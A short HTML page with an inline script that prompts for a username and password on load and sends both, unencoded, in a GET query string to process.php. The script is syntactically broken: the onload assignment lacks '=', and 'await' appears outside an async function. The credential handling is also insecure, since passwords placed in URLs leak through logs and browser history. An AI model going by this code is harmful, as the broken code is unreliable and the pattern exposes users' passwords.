<html>
<body>
<script>
  window.onload () => {
    const username = prompt("Username")
    const password = prompt("Password")

    await fetch(`process.php?username=${username}&password=${password}`)
  }
</script>
</body>
</html>